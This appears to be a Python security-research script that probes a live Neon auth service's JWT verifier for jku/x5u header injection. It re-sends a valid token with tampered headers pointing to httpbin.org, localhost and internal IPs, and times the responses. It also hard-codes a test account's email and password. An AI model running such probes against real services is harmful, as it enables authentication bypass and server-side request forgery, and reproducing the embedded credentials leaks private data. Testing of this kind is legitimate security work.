# -*- coding: utf-8 -*-
"""V12b: decisive jku test - kid=NONEXISTENT + jku=remote.
Key selection happens BEFORE signature verify (proven: H/I/J/L -> jwk not found).
If verifier honors jku, missing local kid + jku set -> fetch attempt / different
error. If still 'jwk not found' -> jku fully ignored (safe).
Also fixes V12 method bug: baseline = RAW token (no repack)."""
import json, ssl, time, http.client, base64

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
AP = "ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def req(host, method, path, body=None, hdr=None, timeout=25):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json'}
        if hdr:
            h.update(hdr)
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        conn.close()
        return r.status, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}


def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace('+', '-').replace('/', '_').rstrip('=')


def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')


def main():
    out("== V12b decisive jku (kid=nonexistent) ==")
    st, raw, hdrs1 = req(NA_HOST, 'POST', '/neondb/auth/sign-in/email',
                         {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                         {'Origin': 'http://localhost:3000'})
    sc = hdrs1.get('set-cookie') or ''
    ck = '; '.join(x.strip().split(';')[0] for x in sc.split(',') if '=' in x)
    st2, raw2, _ = req(NA_HOST, 'GET', '/neondb/auth/token', hdr={'Cookie': ck})
    jwt = json.loads(raw2).get('token', '')
    h_part, p_part, s_part = jwt.split('.')
    hdr_j = json.loads(dec(h_part))
    out("fidelity check repack==orig: %s" % (b64u(json.dumps(hdr_j)) == h_part))

    # baseline: RAW token untouched
    st3, raw3, _ = req(AP, 'GET', '/neondb/rest/v1/', hdr={'Authorization': 'Bearer ' + jwt})
    out("A RAW token (ctrl)             -> %d %s" % (st3, raw3[:150]))
    time.sleep(0.5)

    def probe(tag, header_dict):
        # build compact header, must keep same shape as orig for valid-signature cases
        nh = b64u(json.dumps(header_dict))
        tok = nh + '.' + p_part + '.' + s_part
        st4, raw4, _ = req(AP, 'GET', '/neondb/rest/v1/', hdr={'Authorization': 'Bearer ' + tok})
        out("%-46s -> %d %s" % (tag, st4, raw4[:150].replace('\n', ' ')))
        time.sleep(0.6)

    # key-selection-stage probes (kid NOT found -> error reveals lookup behavior)
    probe("B kid=nonexist (ctrl)", {"alg": "EdDSA", "kid": "zz-nonexistent-kid"})
    probe("C kid=nonexist + jku=httpbin", {"alg": "EdDSA", "kid": "zz-nonexistent-kid",
                                           "jku": "https://httpbin.org/anything"})
    probe("D kid=nonexist + jku=127.0.0.1:1", {"alg": "EdDSA", "kid": "zz-nonexistent-kid",
                                               "jku": "https://127.0.0.1:1/jwks.json"})
    probe("E kid=nonexist + jku=self jwks", {"alg": "EdDSA", "kid": "zz-nonexistent-kid",
                                             "jku": "https://%s/neondb/.well-known/jwks.json" % NA_HOST})
    probe("F kid=nonexist + x5u", {"alg": "EdDSA", "kid": "zz-nonexistent-kid",
                                   "x5u": "https://httpbin.org/cert"})
    probe("G kid=nonexist + no kid", {"alg": "EdDSA"})
    # with VALID kid + jku (key found locally -> signature stage; error should be signature)
    probe("H validkid + jku=httpbin", {"alg": "EdDSA", "kid": hdr_j["kid"],
                                       "jku": "https://httpbin.org/anything"})
    # response-time check for fetch attempts (D should be fast-fail if fetched)
    t0 = time.time()
    probe("I timing: kid=nonexist+jku=10.255.255.1", {"alg": "EdDSA", "kid": "zz-nonexistent-kid",
                                                      "jku": "https://10.255.255.1/jwks.json"})
    out("   elapsed %.2fs" % (time.time() - t0))
    t0 = time.time()
    probe("J timing: kid=nonexist (ctrl)", {"alg": "EdDSA", "kid": "zz-nonexistent-kid"})
    out("   elapsed %.2fs" % (time.time() - t0))
    out("done")


if __name__ == "__main__":
    main()
